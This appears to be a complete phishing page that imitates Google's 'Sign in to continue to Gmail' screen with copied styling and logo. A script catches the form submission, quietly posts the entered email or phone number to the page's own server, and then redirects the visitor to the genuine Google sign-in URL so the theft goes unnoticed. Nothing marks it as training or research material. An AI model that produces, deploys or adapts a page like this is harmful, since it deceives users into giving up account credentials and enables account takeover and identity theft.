<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Sign in - Google Accounts</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;background:white}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.card{width:448px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}.logo{text-align:center;margin-bottom:16px}.logo svg{width:75px}.title{text-align:center;font-size:24px;font-weight:400;margin-bottom:8px}.sub{text-align:center;font-size:16px;font-weight:400;margin-bottom:32px}.field{position:relative;margin-bottom:24px}.field input{width:100%;padding:22px 15px 8px;height:56px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;background:transparent}.field label{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:#5f6368;font-size:16px;transition:all 0.15s;pointer-events:none;background:white;padding:0 4px}.field input:focus+label,.field input:valid+label{top:8px;font-size:12px;color:#1a73e8}.field input:focus{border:2px solid #1a73e8}.action{display:flex;justify-content:space-between;align-items:center}.action a{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}.action input{background:#1a73e8;color:white;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}.action input:hover{background:#1765cc}</style></head><body><div class="container"><div class="card"><div class="logo"><svg viewBox="0 0 75 24"width="75"height="24"><path d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L14.4 5.5C13.5 4.58 12.17 4 10.88 4 7.46 4 4.67 6.73 4.67 10.01s2.79 6.01 6.21 6.01c2.42 0 4.04-.96 4.97-2.22.95-1.24 1.24-3.01 1.24-4.43 0-.39-.03-.78-.1-1.18H9.24z"fill="#4285F4"/></svg></div><div class="title">Sign in</div><div class="sub">to continue to Gmail</div><form method="POST"><div class="field"><input type="email"name="identifier"required><label>Email or phone</label></div><div style="margin-top:32px;color:#5f6368;font-size:14px">Not your computer? Use Guest mode to sign in privately. <a href="#"style="color:#1a73e8;text-decoration:none">Learn more</a></div><div class="action"style="margin-top:40px"><a href="#">Create account</a><input type="submit"value="Next"></div></form></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://accounts.google.com/signin/v2/identifier';});});</script></body></html>
